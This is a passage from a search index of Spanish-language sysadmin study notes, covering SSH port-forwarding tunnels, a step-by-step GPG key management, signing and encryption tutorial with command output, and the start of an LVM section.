el host-local hace la resoluci\u00f3n de host-destino, host-destino hace la resoluci\u00f3n de host-remoto. As\u00ed aun que host-local no sabe la resoluci\u00f3n de portatil, no importa por que la har\u00e1 host-destino. [ fedora@aws ~ ] $ ssh -L 3034 :portatil:13 pi@casa","title":"Directos"},{"location":"seguridad/TunelSSH/#inversos","text":"local-destino : host-local (aws) corre un servicio de daytime en el puerto 13, pero es solo local el firewall corta todas las entradas. Entonces desde aws conecto con host-destino (casa) y abro el puerto 3035 donde conecta con el localhost:13 de aws. [ fedora@aws ~ ] $ ssh -R 3035 :localhost:13 pi@casa pi@casa:~ $ curl http://localhost:3035 17 MAR 2020 17 :19:08 UTC local-destino-remoto : En este ejemplo El firewall bloquea todas las entradas del exterior, entonces desde casa establezco una conexi\u00f3n inversa con aws para que desde el puerto aws:3035 pueda acceder a casa y la redirijo al portatil:13 que tiene el servidor daytime. casa \u279c ssh -R 3035 :portatil:13 fedora@aws [ fedora@aws ~ ] $ curl http://localhost:3035 17 MAR 2020 17 :38:34 UTC diagrama: +-+ +----+ | | | | portatil firewall | | P:13 | | +----+ aws | | ^ | | | +---+ | | +-----+ | | | | | | | | <-----------+ | | +---+ | | +-----+ P:3035 +-+ casa","title":"Inversos"},{"location":"seguridad/TunelSSH/#dinamicos","text":"ssh -D 9000 home","title":"dinamicos"},{"location":"seguridad/gpg/","text":"GPG PGP ( Pretty Good Privacy ) es un mecanismo de cifrado y procesamiento de contenido. en su versi\u00f3n gratuita GPG (Gnu Protection Group ) gpg se utiliza para guardar ficheros cifrados en disco o para mandar ficheros por correo. Tipos de seguridad Data at Rest : Son datos sin movimiento, se protege con RAID, LVM, Backups, GPG, luks ( particiones encriptadas ). Data on Motion : datos en movimiento, se protege via SSL, TLS, ... Estos datos suelen utilizar criptograf\u00eda sim\u00e9trica. Definiciones Cifrar : puedes verlo pero no leerlo, ya que es un texto plano encriptado de alguna manera, solo lo podr\u00e1 leer el emisor y el receptor. El cifrado de un texto puede ser en .der binario o .pem ascci base 64. Autenticar : demostrar quien eres, el mensaje verifica que el emisor es quien dice ser. intregridad : es cierto que no se a tocado nada del contenido en el viaje. no repudiar : no puedes negar que es tuyo firmar : integra autenticar, integridad y no repudiar. El emisor firma con la clave privada un documento, el destinatario con la clave publica del emisor verifica que es de dicho emisor, porque desenrosca tiene integridad y no puede negar que es suyo. Al firmar se a\u00f1ade al final del documento un hash que es extra\u00eddo del documento y adem\u00e1s se firma con la clave privada, el receptor verificara la firma con la clave publica y si el documento genera un hash igual que el enviado, el texto no a sido modificado. Hash Hash ( no es un cifrado, ni certificado de claves ) MD5, SHA Es una funci\u00f3n que dada una informaci\u00f3n de entrada, genera un valor que no puede ser generado por ninguna otra entrada, a no ser que sea la misma. El mas m\u00ednimo cambio generar\u00e1 un c\u00f3digo de bytes completamente diferente. La funci\u00f3n es una transformaci\u00f3n, no encripta, no se puede obtener el resultado inicial a partir del resultado final. Criptograf\u00eda Sim\u00e9trica : una palabra o frase secreta que se usa tanto para cifrar como descifrar, las claves son mas peque\u00f1as y algoritmo mas r\u00e1pido. La cable privada se guarda con criptograf\u00eda sim\u00e9trica si le indicamos la passfrase que pide al generar las keys, en caso contrario se guarda en texto plano. El inconveniente de guardarla encriptada es que cada vez que se tenga qu utilizar pedir\u00e1 la passfrase para desencriptarse. Asim\u00e9trica : claves mas largas algoritmo lento. Utiliza clave privada y publica, la privada se mantiene solo el propietario la publica contra mas la tengan mejor. Para una comunicaci\u00f3n bidireccional las dos pares han de tener la publica del otro extremo, ya que con la publica se encripta y con la privada se desencripta. Modelos de seguridad PKI public key infraestructura: mecanismo piramidal hay alguien que te tiene que autenticar Web of trust : confiar en quien yo quiero. para que esto funcione tiene que haber intercambio de claves p\u00fablicas. Gestionar claves gpg --gen-key genera claves con distintos formatos, tiempo de duraci\u00f3n y una clave passfrase. este crea un directorio en ~/.gnupg/ donde guarda las claves. A destacar que Keyring llavero donde est\u00e1n las llaves y secring llavero p\u00fablico. generar llaves gpg --gen-key gpg --full-gen-key Se escoge el tipo de cifrado y tama\u00f1o Por favor seleccione tipo de clave deseado: ( 1 ) RSA y RSA ( por defecto ) ( 2 ) DSA y ElGamal ( 3 ) DSA ( s\u00f3lo firmar ) ( 4 ) RSA ( s\u00f3lo firmar ) Su elecci\u00f3n: 1 las claves RSA pueden tener entre 1024 y 4096 bits de longitud. \u00bfDe qu\u00e9 tama\u00f1o quiere la clave? ( 3072 ) Cuando caduca Por favor, especifique el per\u00edodo de validez de la clave. 0 = la clave nunca caduca <n> = la clave caduca en n d\u00edas <n>w = la clave caduca en n semanas <n>m = la clave caduca en n meses <n>y = la clave caduca en n a\u00f1os \u00bfValidez de la clave ( 0 ) ? La clave nunca caduca \u00bfEs correcto? ( s/n ) s Se a\u00f1ade identificadores y contrase\u00f1a Nombre y apellidos: user1 edt Direcci\u00f3n de correo electr\u00f3nico: user1@edt.org Comentario: cc Ha seleccionado este ID de usuario: \"user1 edt (cc) <user1@edt.org>\" claves p\u00fablica y secreta creadas y firmadas. pub rsa3072 2020 -02-11 [ SC ] B3A2BCDF9FFB9991A7374A369241A986C5CB7445 uid user1 edt ( cc ) <user1@edt.org> sub rsa3072 2020 -02-11 [ E ] Listar claves user1@pc02:~$ gpg --list-key gpg: comprobando base de datos de confianza gpg: marginals needed: 3 completes needed: 1 trust model: pgp gpg: nivel: 0 validez: 1 firmada: 0 confianza: 0 -, 0q, 0n, 0m, 0f, 1u /home/user1/.gnupg/pubring.kbx ------------------------------ pub rsa3072 2020 -02-11 [ SC ] B3A2BCDF9FFB9991A7374A369241A986C5CB7445 uid [ absoluta ] user1 edt ( cc ) <user1@edt.org> sub rsa3072 2020 -02-11 [ E ] Fingerprint user1@pc02:~$ gpg --fingerprint Exportar clave Exportar la clave p\u00fablica sirve para que el destinatario pueda abrir y decodificar nuestros mensajes. gpg --output /tmp/user1.gpg --export user1@edt.org # binario gpg --armor --output /tmp/user1.gpg --export user1@edt.org # en texto plano cifrado base 64 # exportar todas las claves que tenga. gpg --output /tmp/user1.gpg --export Importar clave importar claves permite decodificar documentos de otros usuarios. user2@pc02:~$ gpg --import /tmp/user1.gpg gpg: creado el directorio '/home/user2/.gnupg' gpg: caja de claves '/home/user2/.gnupg/pubring.kbx' creada gpg: /home/user2/.gnupg/trustdb.gpg: se ha creado base de datos de confianza gpg: clave 9241A986C5CB7445: clave p\u00fablica \"user1 edt (cc) <user1@edt.org>\" importada gpg: Cantidad total procesada: 1 gpg: importadas: 1 vemos como ahora user2 tiene su propia clave mas la p\u00fablica de user1 user2@pc02:~$ gpg --list-key ------------------------------ pub rsa3072 2020 -02-11 [ SC ] B3A2BCDF9FFB9991A7374A369241A986C5CB7445 uid [ desconocida ] user1 edt ( cc ) <user1@edt.org> sub rsa3072 2020 -02-11 [ E ] pub rsa3072 2020 -02-11 [ SC ] [ caduca: 2022 -02-10 ] 3E409CD05DEEAB9583410521A7005DFA20B44BD3 uid [ absoluta ] user2 edt <user2@edt.org> sub rsa3072 2020 -02-11 [ E ] [ caduca: 2022 -02-10 ] Confirmar clave user2@pc02:~$ gpg --edit-key user1@edt.org gpg> fpr --> Mostra el fingerprint gpg> sign --> Firma la clau p\u00fablica com a v\u00e0lida, utilitzando su propio passfrase de user2 gpg> quit \u00bfGrabar cambios? ( s/N ) s Cifrar archivo puedo cifrar un documento para user1 por que tengo su clave p\u00fablica # en binaro user2@pc02:~$ gpg --output /tmp/fstab.gpg --encrypt --recipient user1@edt.org /etc/fstab # en base64 user2@pc02:~$ gpg --armor --output /tmp/passwd.pem --encrypt --recipient user1@edt.org passwd.txt Descifrar desde user1 puedo descifrar un archivo que se a creado con mi clave p\u00fablica user1@pc02:~$ gpg --decrypt /tmp/fstab.gpg Firmar Existen diferentes formas de firmar Archivo codificado Firmar codificando todo el documento, este m\u00e9todo en el caso de archivos grandes no es recomendable. user1@pc02:~$ gpg --output /tmp/missatge.gpg --sign missatge.txt user1@pc02:~$ gpg -a --output /tmp/missatge.pem --sign missatge.txt user2@pc02:~$ gpg --decrypt /tmp/missatge.gpg Hash al final Firmar a\u00f1adiendo hash al final. user1@pc02:~$ gpg -a --output /tmp/missatge.pem --clearsign missatge.txt user1@pc02:~$ cat /tmp/missatge.pem -----BEGIN PGP SIGNED MESSAGE----- Hash: SHA512 hola caracola est son pruebas de gpg -----BEGIN PGP SIGNATURE----- iQGzBAEBCgAdFiEEs6K835/7mZGnN0o2kkGphsXLdEUFAl5K5Z0ACgkQkkGphsXL dEUvSwv+L5/c4+gPmqFAdDmx/VLZud8DWhQHeWsw0G5TVu70Qoo2E1ZR0LgdyZsA S5xoyMzGKQ5BpV4KBTKISz9153TTMelr3ind0xsODYaPTGW3YcbZagbD7HFF7Pea tFJClPLV5Jw3WQW+UkIf1CRZUPu8mTpMzaGsywt06+/99BNjZGoIS9uKku5/L7QS J2dcqI9FX/Cm/SLdsshQ4H8xeTcUcTH+pLfFKlhBCwlz1IvaB7d+QHSw0DIkaOur 7UIENg2CM2GtTHymE5b0ZaGDZX/xamL22XuuSVCuUrPxxTBwYWD2J6IXtpPzNwdf TR3YQW5P5Z0wH09lBPDKED2m+ISi/L+PAWIbxb+5V/DOG5PrFBX0oJQheNrBFaTV xK2/KTgQNd5J9zzLmvFXc7d+zo8N4IL0yxt2L1OJsRqHA2nRXFT6v+Ax9GWaYZs0 bUOeRTQdtOU+pTrnlBEKpwFAWfwZGIjAC3oDFYlYg6Anfshq39UqzeZ+41/ofmin vLh/ONOI = YR4/ -----END PGP SIGNATURE----- user2@pc02:~$ gpg --decrypt /tmp/missatge.pem hola caracola est son pruebas de gpg gpg: Firmado el lun 17 feb 2020 20 :12:29 CET gpg: usando RSA clave B3A2BCDF9FFB9991A7374A369241A986C5CB7445 gpg: Firma correcta de \"user1 edt (cc) <user1@edt.org>\" [ total ] Separado crear hash y firma en un segundo documento, en este caso se tiene que enviar dos archivos, el documento mas la firma, se verifica que no a sido modificado y despu\u00e9s se trabaja con el archivo de texto en este caso. user1@pc02:~$ gpg -a --output /tmp/missatge.pem --detach-sign missatge.txt user1@pc02:~$ cp missatge.txt /tmp/ user2@pc02:~$ gpg --verify /tmp/missatge.pem /tmp/missatge.txt gpg: Firmado el lun 17 feb 2020 20 :17:18 CET gpg: usando RSA clave B3A2BCDF9FFB9991A7374A369241A986C5CB7445 gpg: Firma correcta de \"user1 edt (cc) <user1@edt.org>\" [ total ] Verficar Para verificar una firma hay que tener varias cosas en cuenta: tengo la clave publica del emisor? tengo la clave publica del emisor firmada? # no tengo la clave publica (FAIL) user3@pc02:~$ gpg --verify /tmp/missatge.pem gpg: Firmado el lun 17 feb 2020 20 :17:18 CET gpg: usando RSA clave B3A2BCDF9FFB9991A7374A369241A986C5CB7445 gpg: Imposible comprobar la firma: No hay clave p\u00fablica # tengo la publica pero no esta firmada (Tu sabras si fiarte) user3@pc02:~$ gpg --verify /tmp/missatge.pem gpg: Firmado el lun 17 feb 2020 20 :17:18 CET gpg: usando RSA clave B3A2BCDF9FFB9991A7374A369241A986C5CB7445 gpg: comprobando base de datos de confianza gpg: marginals needed: 3 completes needed: 1 trust model: pgp gpg: nivel: 0 validez: 1 firmada: 0 confianza: 0 -, 0q, 0n, 0m, 0f, 1u gpg: Firma correcta de \"user1 edt (cc) <user1@edt.org>\" [ desconocido ] gpg: ATENCI\u00d3N: \u00a1Esta clave no est\u00e1 certificada por una firma de confianza! gpg: No hay indicios de que la firma pertenezca al propietario. Huellas dactilares de la clave primaria: B3A2 BCDF 9FFB 9991 A737 4A36 9241 A986 C5CB 7445 # tengo la publica y esta firmada (Todo OK) user2@pc02:~$ gpg --verify /tmp/missatge.pem gpg: Firmado el lun 17 feb 2020 20 :17:18 CET gpg: usando RSA clave B3A2BCDF9FFB9991A7374A369241A986C5CB7445 gpg: Firma correcta de \"user1 edt (cc) <user1@edt.org>\" [ total ] Confianza Con la confianza se tiene que tener cuidado y por eso existen diferentes modos. user3@pc02:~$ gpg --edit-key user1@edt.org pub rsa3072/9241A986C5CB7445 creado: 2020 -02-11 caduca: nunca uso: SC confianza: desconocido validez: desconocido Validez : Por un lado esta la validez que es el yo conf\u00edo en ese emisor, y lo activamos firmando la clave publica. Confianza (TRUST) : trust significa, conf\u00edo en los amigos de este usuario? es decir, conf\u00edo en las claves publicas que tiene este usuario de otros usuarios? Esto pasa porque al importar, puedes importar m\u00faltiples claves de un mismo usuario. Por esa complejidad tiene diferentes niveles de confianza. 1 = No lo s\u00e9 o prefiero no decirlo 2 = NO tengo confianza 3 = Conf\u00edo un poco # conf\u00edo si 6 de los que yo conf\u00edo, conf\u00edan en ti. 4 = Conf\u00edo totalmente # conf\u00edo si 3 de los que yo conf\u00edo, conf\u00edan en ti. 5 = conf\u00edo absolutamente m = volver al men\u00fa principal Eliminar claves Eliminar todas las llaves de un usuario user2@pc02:~$ gpg --list-keys /home/user2/.gnupg/pubring.kbx ------------------------------ pub rsa3072 2020 -02-11 [ SC ] [ caduca: 2022 -02-10 ] 3E409CD05DEEAB9583410521A7005DFA20B44BD3 uid [ absoluta ] user2 edt <user2@edt.org> sub rsa3072 2020 -02-11 [ E ] [ caduca: 2022 -02-10 ] pub rsa3072 2020 -02-17 [ SC ] 62811DDBE923D412B65AE99D1286DEC624F83F1A uid [ desconocida ] user3 edt <user3@edt.org> sub rsa3072 2020 -02-17 [ E ] pub rsa3072 2020 -02-11 [ SC ] B3A2BCDF9FFB9991A7374A369241A986C5CB7445 uid [ total ] user1 edt ( cc ) <user1@edt.org> sub rsa3072 2020 -02-11 [ E ] user2@pc02:~$ gpg --delete-keys user1@edt.org Eliminar una clave de un usuario user2@pc02:~$ gpg --edit-key user3@edt.org ... pub rsa3072/1286DEC624F83F1A creado: 2020 -02-17 caduca: nunca uso: SC confianza: desconocido validez: desconocido sub rsa3072/A34F8119A219F135 creado: 2020 -02-17 caduca: nunca uso: E [ desconocida ] ( 1 ) . user3 edt <user3@edt.org> gpg> key 1 pub rsa3072/1286DEC624F83F1A creado: 2020 -02-17 caduca: nunca uso: SC confianza: desconocido validez: desconocido sub* rsa3072/A34F8119A219F135 creado: 2020 -02-17 caduca: nunca uso: E [ desconocida ] ( 1 ) . user3 edt <user3@edt.org> gpg> delkey \u00bfDe verdad quiere borrar esta clave? ( s/N ) s pub rsa3072/1286DEC624F83F1A creado: 2020 -02-17 caduca: nunca uso: SC confianza: desconocido validez: desconocido [ desconocida ] ( 1 ) . user3 edt <user3@edt.org>","title":"GPG"},{"location":"seguridad/gpg/#gpg","text":"PGP ( Pretty Good Privacy ) es un mecanismo de cifrado y procesamiento de contenido. en su versi\u00f3n gratuita GPG (Gnu Protection Group ) gpg se utiliza para guardar ficheros cifrados en disco o para mandar ficheros por correo.","title":"GPG"},{"location":"seguridad/gpg/#tipos-de-seguridad","text":"Data at Rest : Son datos sin movimiento, se protege con RAID, LVM, Backups, GPG, luks ( particiones encriptadas ). Data on Motion : datos en movimiento, se protege via SSL, TLS, ... Estos datos suelen utilizar criptograf\u00eda sim\u00e9trica.","title":"Tipos de seguridad"},{"location":"seguridad/gpg/#definiciones","text":"Cifrar : puedes verlo pero no leerlo, ya que es un texto plano encriptado de alguna manera, solo lo podr\u00e1 leer el emisor y el receptor. El cifrado de un texto puede ser en .der binario o .pem ascci base 64. Autenticar : demostrar quien eres, el mensaje verifica que el emisor es quien dice ser. intregridad : es cierto que no se a tocado nada del contenido en el viaje. no repudiar : no puedes negar que es tuyo firmar : integra autenticar, integridad y no repudiar. El emisor firma con la clave privada un documento, el destinatario con la clave publica del emisor verifica que es de dicho emisor, porque desenrosca tiene integridad y no puede negar que es suyo. Al firmar se a\u00f1ade al final del documento un hash que es extra\u00eddo del documento y adem\u00e1s se firma con la clave privada, el receptor verificara la firma con la clave publica y si el documento genera un hash igual que el enviado, el texto no a sido modificado.","title":"Definiciones"},{"location":"seguridad/gpg/#hash","text":"Hash ( no es un cifrado, ni certificado de claves ) MD5, SHA Es una funci\u00f3n que dada una informaci\u00f3n de entrada, genera un valor que no puede ser generado por ninguna otra entrada, a no ser que sea la misma. El mas m\u00ednimo cambio generar\u00e1 un c\u00f3digo de bytes completamente diferente. La funci\u00f3n es una transformaci\u00f3n, no encripta, no se puede obtener el resultado inicial a partir del resultado final.","title":"Hash"},{"location":"seguridad/gpg/#criptografia","text":"Sim\u00e9trica : una palabra o frase secreta que se usa tanto para cifrar como descifrar, las claves son mas peque\u00f1as y algoritmo mas r\u00e1pido. La cable privada se guarda con criptograf\u00eda sim\u00e9trica si le indicamos la passfrase que pide al generar las keys, en caso contrario se guarda en texto plano. El inconveniente de guardarla encriptada es que cada vez que se tenga qu utilizar pedir\u00e1 la passfrase para desencriptarse. Asim\u00e9trica : claves mas largas algoritmo lento. Utiliza clave privada y publica, la privada se mantiene solo el propietario la publica contra mas la tengan mejor. Para una comunicaci\u00f3n bidireccional las dos pares han de tener la publica del otro extremo, ya que con la publica se encripta y con la privada se desencripta.","title":"Criptograf\u00eda"},{"location":"seguridad/gpg/#modelos-de-seguridad","text":"PKI public key infraestructura: mecanismo piramidal hay alguien que te tiene que autenticar Web of trust : confiar en quien yo quiero. para que esto funcione tiene que haber intercambio de claves p\u00fablicas.","title":"Modelos de seguridad"},{"location":"seguridad/gpg/#gestionar-claves","text":"gpg --gen-key genera claves con distintos formatos, tiempo de duraci\u00f3n y una clave passfrase. este crea un directorio en ~/.gnupg/ donde guarda las claves. A destacar que Keyring llavero donde est\u00e1n las llaves y secring llavero p\u00fablico.","title":"Gestionar claves"},{"location":"seguridad/gpg/#generar-llaves","text":"gpg --gen-key gpg --full-gen-key Se escoge el tipo de cifrado y tama\u00f1o Por favor seleccione tipo de clave deseado: ( 1 ) RSA y RSA ( por defecto ) ( 2 ) DSA y ElGamal ( 3 ) DSA ( s\u00f3lo firmar ) ( 4 ) RSA ( s\u00f3lo firmar ) Su elecci\u00f3n: 1 las claves RSA pueden tener entre 1024 y 4096 bits de longitud. \u00bfDe qu\u00e9 tama\u00f1o quiere la clave? ( 3072 ) Cuando caduca Por favor, especifique el per\u00edodo de validez de la clave. 0 = la clave nunca caduca <n> = la clave caduca en n d\u00edas <n>w = la clave caduca en n semanas <n>m = la clave caduca en n meses <n>y = la clave caduca en n a\u00f1os \u00bfValidez de la clave ( 0 ) ? La clave nunca caduca \u00bfEs correcto? ( s/n ) s Se a\u00f1ade identificadores y contrase\u00f1a Nombre y apellidos: user1 edt Direcci\u00f3n de correo electr\u00f3nico: user1@edt.org Comentario: cc Ha seleccionado este ID de usuario: \"user1 edt (cc) <user1@edt.org>\" claves p\u00fablica y secreta creadas y firmadas. pub rsa3072 2020 -02-11 [ SC ] B3A2BCDF9FFB9991A7374A369241A986C5CB7445 uid user1 edt ( cc ) <user1@edt.org> sub rsa3072 2020 -02-11 [ E ]","title":"generar llaves"},{"location":"seguridad/gpg/#listar-claves","text":"user1@pc02:~$ gpg --list-key gpg: comprobando base de datos de confianza gpg: marginals needed: 3 completes needed: 1 trust model: pgp gpg: nivel: 0 validez: 1 firmada: 0 confianza: 0 -, 0q, 0n, 0m, 0f, 1u /home/user1/.gnupg/pubring.kbx ------------------------------ pub rsa3072 2020 -02-11 [ SC ] B3A2BCDF9FFB9991A7374A369241A986C5CB7445 uid [ absoluta ] user1 edt ( cc ) <user1@edt.org> sub rsa3072 2020 -02-11 [ E ]","title":"Listar claves"},{"location":"seguridad/gpg/#fingerprint","text":"user1@pc02:~$ gpg --fingerprint","title":"Fingerprint"},{"location":"seguridad/gpg/#exportar-clave","text":"Exportar la clave p\u00fablica sirve para que el destinatario pueda abrir y decodificar nuestros mensajes. gpg --output /tmp/user1.gpg --export user1@edt.org # binario gpg --armor --output /tmp/user1.gpg --export user1@edt.org # en texto plano cifrado base 64 # exportar todas las claves que tenga. gpg --output /tmp/user1.gpg --export","title":"Exportar clave"},{"location":"seguridad/gpg/#importar-clave","text":"importar claves permite decodificar documentos de otros usuarios. user2@pc02:~$ gpg --import /tmp/user1.gpg gpg: creado el directorio '/home/user2/.gnupg' gpg: caja de claves '/home/user2/.gnupg/pubring.kbx' creada gpg: /home/user2/.gnupg/trustdb.gpg: se ha creado base de datos de confianza gpg: clave 9241A986C5CB7445: clave p\u00fablica \"user1 edt (cc) <user1@edt.org>\" importada gpg: Cantidad total procesada: 1 gpg: importadas: 1 vemos como ahora user2 tiene su propia clave mas la p\u00fablica de user1 user2@pc02:~$ gpg --list-key ------------------------------ pub rsa3072 2020 -02-11 [ SC ] B3A2BCDF9FFB9991A7374A369241A986C5CB7445 uid [ desconocida ] user1 edt ( cc ) <user1@edt.org> sub rsa3072 2020 -02-11 [ E ] pub rsa3072 2020 -02-11 [ SC ] [ caduca: 2022 -02-10 ] 3E409CD05DEEAB9583410521A7005DFA20B44BD3 uid [ absoluta ] user2 edt <user2@edt.org> sub rsa3072 2020 -02-11 [ E ] [ caduca: 2022 -02-10 ]","title":"Importar clave"},{"location":"seguridad/gpg/#confirmar-clave","text":"user2@pc02:~$ gpg --edit-key user1@edt.org gpg> fpr --> Mostra el fingerprint gpg> sign --> Firma la clau p\u00fablica com a v\u00e0lida, utilitzando su propio passfrase de user2 gpg> quit \u00bfGrabar cambios? ( s/N ) s","title":"Confirmar clave"},{"location":"seguridad/gpg/#cifrar-archivo","text":"puedo cifrar un documento para user1 por que tengo su clave p\u00fablica # en binaro user2@pc02:~$ gpg --output /tmp/fstab.gpg --encrypt --recipient user1@edt.org /etc/fstab # en base64 user2@pc02:~$ gpg --armor --output /tmp/passwd.pem --encrypt --recipient user1@edt.org passwd.txt","title":"Cifrar archivo"},{"location":"seguridad/gpg/#descifrar","text":"desde user1 puedo descifrar un archivo que se a creado con mi clave p\u00fablica user1@pc02:~$ gpg --decrypt /tmp/fstab.gpg","title":"Descifrar"},{"location":"seguridad/gpg/#firmar","text":"Existen diferentes formas de firmar","title":"Firmar"},{"location":"seguridad/gpg/#archivo-codificado","text":"Firmar codificando todo el documento, este m\u00e9todo en el caso de archivos grandes no es recomendable. user1@pc02:~$ gpg --output /tmp/missatge.gpg --sign missatge.txt user1@pc02:~$ gpg -a --output /tmp/missatge.pem --sign missatge.txt user2@pc02:~$ gpg --decrypt /tmp/missatge.gpg","title":"Archivo codificado"},{"location":"seguridad/gpg/#hash-al-final","text":"Firmar a\u00f1adiendo hash al final. user1@pc02:~$ gpg -a --output /tmp/missatge.pem --clearsign missatge.txt user1@pc02:~$ cat /tmp/missatge.pem -----BEGIN PGP SIGNED MESSAGE----- Hash: SHA512 hola caracola est son pruebas de gpg -----BEGIN PGP SIGNATURE----- iQGzBAEBCgAdFiEEs6K835/7mZGnN0o2kkGphsXLdEUFAl5K5Z0ACgkQkkGphsXL dEUvSwv+L5/c4+gPmqFAdDmx/VLZud8DWhQHeWsw0G5TVu70Qoo2E1ZR0LgdyZsA S5xoyMzGKQ5BpV4KBTKISz9153TTMelr3ind0xsODYaPTGW3YcbZagbD7HFF7Pea tFJClPLV5Jw3WQW+UkIf1CRZUPu8mTpMzaGsywt06+/99BNjZGoIS9uKku5/L7QS J2dcqI9FX/Cm/SLdsshQ4H8xeTcUcTH+pLfFKlhBCwlz1IvaB7d+QHSw0DIkaOur 7UIENg2CM2GtTHymE5b0ZaGDZX/xamL22XuuSVCuUrPxxTBwYWD2J6IXtpPzNwdf TR3YQW5P5Z0wH09lBPDKED2m+ISi/L+PAWIbxb+5V/DOG5PrFBX0oJQheNrBFaTV xK2/KTgQNd5J9zzLmvFXc7d+zo8N4IL0yxt2L1OJsRqHA2nRXFT6v+Ax9GWaYZs0 bUOeRTQdtOU+pTrnlBEKpwFAWfwZGIjAC3oDFYlYg6Anfshq39UqzeZ+41/ofmin vLh/ONOI = YR4/ -----END PGP SIGNATURE----- user2@pc02:~$ gpg --decrypt /tmp/missatge.pem hola caracola est son pruebas de gpg gpg: Firmado el lun 17 feb 2020 20 :12:29 CET gpg: usando RSA clave B3A2BCDF9FFB9991A7374A369241A986C5CB7445 gpg: Firma correcta de \"user1 edt (cc) <user1@edt.org>\" [ total ]","title":"Hash al final"},{"location":"seguridad/gpg/#separado","text":"crear hash y firma en un segundo documento, en este caso se tiene que enviar dos archivos, el documento mas la firma, se verifica que no a sido modificado y despu\u00e9s se trabaja con el archivo de texto en este caso. user1@pc02:~$ gpg -a --output /tmp/missatge.pem --detach-sign missatge.txt user1@pc02:~$ cp missatge.txt /tmp/ user2@pc02:~$ gpg --verify /tmp/missatge.pem /tmp/missatge.txt gpg: Firmado el lun 17 feb 2020 20 :17:18 CET gpg: usando RSA clave B3A2BCDF9FFB9991A7374A369241A986C5CB7445 gpg: Firma correcta de \"user1 edt (cc) <user1@edt.org>\" [ total ]","title":"Separado"},{"location":"seguridad/gpg/#verficar","text":"Para verificar una firma hay que tener varias cosas en cuenta: tengo la clave publica del emisor? tengo la clave publica del emisor firmada? # no tengo la clave publica (FAIL) user3@pc02:~$ gpg --verify /tmp/missatge.pem gpg: Firmado el lun 17 feb 2020 20 :17:18 CET gpg: usando RSA clave B3A2BCDF9FFB9991A7374A369241A986C5CB7445 gpg: Imposible comprobar la firma: No hay clave p\u00fablica # tengo la publica pero no esta firmada (Tu sabras si fiarte) user3@pc02:~$ gpg --verify /tmp/missatge.pem gpg: Firmado el lun 17 feb 2020 20 :17:18 CET gpg: usando RSA clave B3A2BCDF9FFB9991A7374A369241A986C5CB7445 gpg: comprobando base de datos de confianza gpg: marginals needed: 3 completes needed: 1 trust model: pgp gpg: nivel: 0 validez: 1 firmada: 0 confianza: 0 -, 0q, 0n, 0m, 0f, 1u gpg: Firma correcta de \"user1 edt (cc) <user1@edt.org>\" [ desconocido ] gpg: ATENCI\u00d3N: \u00a1Esta clave no est\u00e1 certificada por una firma de confianza! gpg: No hay indicios de que la firma pertenezca al propietario. Huellas dactilares de la clave primaria: B3A2 BCDF 9FFB 9991 A737 4A36 9241 A986 C5CB 7445 # tengo la publica y esta firmada (Todo OK) user2@pc02:~$ gpg --verify /tmp/missatge.pem gpg: Firmado el lun 17 feb 2020 20 :17:18 CET gpg: usando RSA clave B3A2BCDF9FFB9991A7374A369241A986C5CB7445 gpg: Firma correcta de \"user1 edt (cc) <user1@edt.org>\" [ total ]","title":"Verficar"},{"location":"seguridad/gpg/#confianza","text":"Con la confianza se tiene que tener cuidado y por eso existen diferentes modos. user3@pc02:~$ gpg --edit-key user1@edt.org pub rsa3072/9241A986C5CB7445 creado: 2020 -02-11 caduca: nunca uso: SC confianza: desconocido validez: desconocido Validez : Por un lado esta la validez que es el yo conf\u00edo en ese emisor, y lo activamos firmando la clave publica. Confianza (TRUST) : trust significa, conf\u00edo en los amigos de este usuario? es decir, conf\u00edo en las claves publicas que tiene este usuario de otros usuarios? Esto pasa porque al importar, puedes importar m\u00faltiples claves de un mismo usuario. Por esa complejidad tiene diferentes niveles de confianza. 1 = No lo s\u00e9 o prefiero no decirlo 2 = NO tengo confianza 3 = Conf\u00edo un poco # conf\u00edo si 6 de los que yo conf\u00edo, conf\u00edan en ti. 4 = Conf\u00edo totalmente # conf\u00edo si 3 de los que yo conf\u00edo, conf\u00edan en ti. 5 = conf\u00edo absolutamente m = volver al men\u00fa principal","title":"Confianza"},{"location":"seguridad/gpg/#eliminar-claves","text":"Eliminar todas las llaves de un usuario user2@pc02:~$ gpg --list-keys /home/user2/.gnupg/pubring.kbx ------------------------------ pub rsa3072 2020 -02-11 [ SC ] [ caduca: 2022 -02-10 ] 3E409CD05DEEAB9583410521A7005DFA20B44BD3 uid [ absoluta ] user2 edt <user2@edt.org> sub rsa3072 2020 -02-11 [ E ] [ caduca: 2022 -02-10 ] pub rsa3072 2020 -02-17 [ SC ] 62811DDBE923D412B65AE99D1286DEC624F83F1A uid [ desconocida ] user3 edt <user3@edt.org> sub rsa3072 2020 -02-17 [ E ] pub rsa3072 2020 -02-11 [ SC ] B3A2BCDF9FFB9991A7374A369241A986C5CB7445 uid [ total ] user1 edt ( cc ) <user1@edt.org> sub rsa3072 2020 -02-11 [ E ] user2@pc02:~$ gpg --delete-keys user1@edt.org Eliminar una clave de un usuario user2@pc02:~$ gpg --edit-key user3@edt.org ... pub rsa3072/1286DEC624F83F1A creado: 2020 -02-17 caduca: nunca uso: SC confianza: desconocido validez: desconocido sub rsa3072/A34F8119A219F135 creado: 2020 -02-17 caduca: nunca uso: E [ desconocida ] ( 1 ) . user3 edt <user3@edt.org> gpg> key 1 pub rsa3072/1286DEC624F83F1A creado: 2020 -02-17 caduca: nunca uso: SC confianza: desconocido validez: desconocido sub* rsa3072/A34F8119A219F135 creado: 2020 -02-17 caduca: nunca uso: E [ desconocida ] ( 1 ) . user3 edt <user3@edt.org> gpg> delkey \u00bfDe verdad quiere borrar esta clave? ( s/N ) s pub rsa3072/1286DEC624F83F1A creado: 2020 -02-17 caduca: nunca uso: SC confianza: desconocido validez: desconocido [ desconocida ] ( 1 ) . user3 edt <user3@edt.org>","title":"Eliminar claves"},{"location":"seguridad/lvm/","text":"Lvm logical volum manager Con LVM podemos re-dimensionar espacios, a\u00f1adir o quitar discos estando en caliente. De las particiones f\u00edsicas reales se crean discos virtuales, y de esos virtuales creas las particiones a utilizar. PV : phisical volume Se refiere a particiones en un disco real. VG : volum group Discos virtuales que crea lvm partiendo de x numero de particiones PV. LV : logical volum Particiones del disco virtual de las que montaremos nuestros datos. Ordenes # display lsblk # para ver nuestros discos sudo pvs # ver volumens fisicos sudo pvdisplay sudo vgs # ver discos virtuales sudo vgdisplay sudo lvs # ver particiones logicas sudo lvdisplay # accion sudo pvcreate /dev/<disco> # crear volumen fisico sudo vgcreate <nombre de grupo> /dev/<disco>... # crear disco virtual # crear particion logica sudo lvcreate -L +<tama\u00f1o que quieres 200M> -n 